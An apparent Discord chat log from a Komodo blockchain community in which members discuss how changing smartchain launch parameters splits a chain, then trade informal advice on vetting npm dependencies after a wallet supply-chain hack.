[05-Jun-21 11:53 PM] digiotai#8327
Hi. I dont know if this a right place..If someone change smartchain parameters with slightly changes such as ac_era, will it still consider hardfork? 

What i have tried is sync to a chain, then stop daemon. Rerun daemon with slightly different era, but still the same name and others ac parameter. I notice the daemon only change p2p port, but rpc port still the same as it was. So i was wondering if suddenly majority of the nodes change to new parameter..will it split the chain or it will be the longest chain wins which invalidate the original launch parameter. Thanks in forward.


[08-Jun-21 03:08 AM] Alright#0419
@digiotai it will immediately split the chain as soon as the rule you changed is violated

👍 

[08-Jun-21 03:09 AM] Alright#0419
also it will break the ability to resync the chain from block 0 as the block files on disk will correspond to a different chain


[08-Jun-21 03:49 AM] digiotai#8327
thanks. i see it really split the chain. will the new chain carry on the same balance as on original chain?


[08-Jun-21 03:50 AM] Alright#0419
it will work if you are simply testing things, but you cannot do this for a production chain

[08-Jun-21 04:49 AM] gcharang#6833
changing any parameter that starts with `-ac` means creating a new chain. your rpcport may have stayed the same because it would have existed in the `~/.komodo/NAME/NAME.conf` file.

I want to respond to this in a serious matter. I, for one, I am very inexperienced. Especially when it comes to certain areas. I follow tutorials and lucky for me, GitHub has showed me the insecurities from certain packages.


[25-Oct-21 03:33 AM] cryptosammy#3587
"We found potential security vulnerabilities in your dependencies." ( GitHub dependabot )


[25-Oct-21 03:40 AM] cryptosammy#3587
Packages, software, things are made by human beings. And sometimes, I blindly do use npm packages. If I didn't had that notice from Dependabot, I'd probably build the whole Lore MMO server on these insecure packages. So, I know NOW not to blindly pick a package. However, I still do not have the experience, the knowledge how to really verify how "secure" a package is. The reason to use packages are to speed up development. I am not sure how the Agama wallet hack took place, but the story about a single package can be overlooked by many people. 

Please, do tell someone like me, someone who has been recently using JavaScript/Node, how to be cautious in regard to NPM packages. Teach me, and others - who will certainly follow - how to be less blind. What checklists should at least be done (and I get that you have to be abstract, but being specific will be more helpful) that someone can do themselves without directly hiring a security expert (because budget and availability are not always there). I really would like to learn how to work towards a secure environment - I have to, as my responsibility to future players, requires I do my best to provide a safe stack of technology.

> Please, do tell someone like me, someone who has been recently using JavaScript/Node, how to be cautious in regard to NPM packages.
1) I'm not some happy happy saint that never uses npm (most of my public repos do use it)
2) We all use it in production more from a place of laziness than any actual necessity 
3) For every step of convenience we take, we take one to three steps further from security (this includes all of life, not just code)
4) My comment about "blindly" was more aimed at those just randomly plunking something into a meaningful project, sticking it into production, and consciously or unconsciously praying that nothing goes wrong; not aimed at those looking at things and trying to safely (or as safely as they can) learn
5) see 3)
6) Always use things in some sort of sandbox environment unless you are personally 100% sure they are safe (take it from someone who lost $40k playing stupid games and winning stupid prizes by *not* doing that)
7) see 3)

[25-Oct-21 08:18 AM] cryptosammy#3587
@ComputerGenie makes perfect sense, but in my case convenience is that building it myself would most likely create a worse threat of security than work made by someone far better qualified. As you are way more experienced in these matters - otherwise your remarks wouldn't make sense - I would like to have a more "hands on" recipe. Let me try to explain. There is butter, flower, eggs, sugar, yeast and when mixed in a good proportion, they become a mix for cake. A good oven, the right temperature and time results in a really good cake. However, I skip the sugar, yeast and flower by buying a "cake mix" package. Yup, for convenience, so lets stick to that. I learn by watching a news bulletin that cake mixes can result in hairy legs and large fangs. I get paranoid and want to avoid all cake mixes, while there are many good cakemixes out there. I am asking you how I should read the information on the back of the cake mix package. What should I look for, what are the obvious red flags I should look for, if I should test it, how do I test it and what for? What tools do I use? Which sources are reliable? 

I hope you can help to become a little more knowledgeable.

*NPM is not doing any checks whatsoever. They are just a registry. The whole thing is built on the trust in the dev community and sharing.*


[25-Oct-21 08:46 AM] cryptosammy#3587
**Question 1**
How do you look at online security scanners, such as Snyk? Do you have alternatives that are open source or like a platform that can be setup without paying a monthly fee (so a budget can go to a contributor)?


[25-Oct-21 08:50 AM] cryptosammy#3587
**Question 2**
How can security scanning go hand in hand with daily coding?  There is a lot of coding mixes in Lore of the Tokels. Where can I find help in this regard?


[25-Oct-21 08:51 AM] cryptosammy#3587
**Question 3**
There must be a lot of people with a security background in coding, or maybe an institute or group that can review all code. Which party or who should I look into?


[25-Oct-21 08:52 AM] ComputerGenie#7004
OK, think of it this way:
you want to make a cake....
you need butter, flower, eggs, sugar, yeast
but, instead of butter you use some random supplier who uses a 15th party producer who, instead of butter, substitutes battery acid for citric acid in their production of margarine and sends that instead
are you really better off than whatever lumpy cake you'd have made on your own?


[25-Oct-21 08:53 AM] cryptosammy#3587
ok, so what you say is to look at the dependencies of my dependency


[25-Oct-21 08:53 AM] ComputerGenie#7004
yes, that too


[25-Oct-21 08:53 AM] cryptosammy#3587
if the trail is too long, thats a red flag


[25-Oct-21 08:55 AM] cryptosammy#3587
so what if I don't know how to get butter or without butter there won't be a cake for the party where the guests are anxiously waiting for the cake. How can I test for battery acid? And go for the next one, until I am sure there won't be battery acid in the cake? Or even better, how can I test my own code for not having battery acid as I am blind 😄


[25-Oct-21 08:55 AM] ComputerGenie#7004
my best suggestion is
"never get in over your head"
pull everything you work with/on apart and learn "what makes it tick", then do it over yourself and/or incorporate some/all of it directly (rather than a changeable by someone else "package")


[25-Oct-21 08:56 AM] ComputerGenie#7004
follow the code and learn what it does when
once you understand it, use it


[25-Oct-21 08:56 AM] ComputerGenie#7004
side by side, a search engine and existing code can be powerful learning tools


[25-Oct-21 09:01 AM] ComputerGenie#7004
> Or even better, how can I test my own code for not having battery acid as I am blind
literally look at the code and search for what it means/does
search 1: in the code itself (is this a self-referencing function?)
search 2: online ("OK, it's a node/js function, what does it do?")
literally line by line until you understand every line
now move on to the next thing
you'll have less and less to search with each thing you look at because you learned things from the previous looking

*side by side, a search engine and existing code can be powerful learning tools*
Search engines can give misleading results. I see some good, some bad. I am asking you about your experiences and which tools you would pick.

(I have no idea what a self referencing function is)


[25-Oct-21 09:03 AM] cryptosammy#3587
(or how to recognise one)

literally what I did when teaching myself
goggle "node.js" and <https://www.w3schools.com/js/default.asp>, find resources that explain what the functions are called and what they do


[25-Oct-21 09:06 AM] ComputerGenie#7004
means the function is not part of js or node, but rather a function defined elsewhere in the code

one example would be in the `promise` code...
`onFulfilled` and`onRejected` are functions created inside the code and not inside node or js itself

I really see how gifted you are and why I keep yammering to learn from you. I hope you can see that not everyone - wait, lets keep this to me - that I am not so gifted. I have concentration problems and sometimes I see things but more than often I overlook things or compulsively. I clicked on the link and I do not see anything about a self referencing function. I try to understand why these kind of functions are a security threat.

I'm far from "gifted" 
When I started, I made more things that didn't work than did (just like every beginner)


[25-Oct-21 09:15 AM] ComputerGenie#7004
being self-taught is more rewarding (imo), but it takes far more work, discipline, and drive to get "there"


[25-Oct-21 09:17 AM] cryptosammy#3587
Nevermind I have found some resources.

there are some practice a dev can adopt to have better security for any programming languge:
- Any 3rd party package/module/plugin which is required to be used should be forked or just directly included a copy of it to the source code.
- Review and merge updates from these 3rd party dependencies. Put a watch/noticiations on updates for these 3rd party dependencies on Github if possible. Send notificaitons right in the email.

It is usual than more work to handle using 3rd party dependencies this way, but at least it's safer.
But in case of Node.js it's a great pain and a mess!
For that reason, I looked around to divert to some other different langauges options and started learning and using Golang. Turns out, even that's insufficient, and you has to know C language as well if need to interact with different langauges. 😅 So, went through C lanuage as well afer almost 2 decades of touching that lanuage in graduate classes.
For a programmer, there is no actual focused thing. Things are moving far and wide in so many directions, you can't live without knowing and understanding many different things.
Hope you find your peace in coding too 🤞🖖

Thank you! Forking and using watches make sense. Instead of email, is there a tool that consumes all ? I am already thinking about a Bot. GitHub integrations are on my todo list.


[25-Oct-21 10:38 AM] grewalsatinder#9653
Just get away from Node.js if possibly can 😅


[25-Oct-21 10:41 AM] BitSec#1898
@grewalsatinder not even that just write everything yourself from scratch xD


[25-Oct-21 10:42 AM] grewalsatinder#9653
in all seriousness, even better


[25-Oct-21 10:42 AM] BitSec#1898
I mean I wouldn't think so


[25-Oct-21 10:43 AM] grewalsatinder#9653
I know, we are lazy enough to think about it 😅


[25-Oct-21 10:43 AM] BitSec#1898
Chances that you make a mistake / create a bug is probably higher dont you think?


[25-Oct-21 10:43 AM] grewalsatinder#9653
but there are actually some really skilled coders who actually does that


[25-Oct-21 10:43 AM] BitSec#1898
Or at least for me. I for sure will fuck up something xD creating major bug / exploit in core code haha


[25-Oct-21 10:43 AM] BitSec#1898
I know haha xD I am not one of them I'll be honest haha


[25-Oct-21 10:44 AM] grewalsatinder#9653
if you are capable enough to code things from scratch, then you are also capable to fix criticle bugs too


[25-Oct-21 10:44 AM] BitSec#1898
True if you know what the bug is you can probably fix it. I don't think I've ever heard about a bug that was unable to be fixed.


[25-Oct-21 10:45 AM] BitSec#1898
I only heard about bugs that would not get fixed because it would take too long to dig through all the legacy code etc xD


[25-Oct-21 10:45 AM] grewalsatinder#9653
yep


[25-Oct-21 10:46 AM] grewalsatinder#9653
I tried to do the same from scratch and importing code to my own code in my kmdgo and saplinglib packages

better to create your own bug than import someone else's hack into your wallet, no?


[25-Oct-21 10:51 AM] BitSec#1898
I mean depends who that someone else is I guess.


[25-Oct-21 10:52 AM] BitSec#1898
By the time you've created your entire application you have so much code it'll become impossible to be aware of all security risks.


[25-Oct-21 10:53 AM] ComputerGenie#7004
I sent 10k SAFE to a malformed valid addy because of a screwup I created and that's still better imo than the hack that started this convo
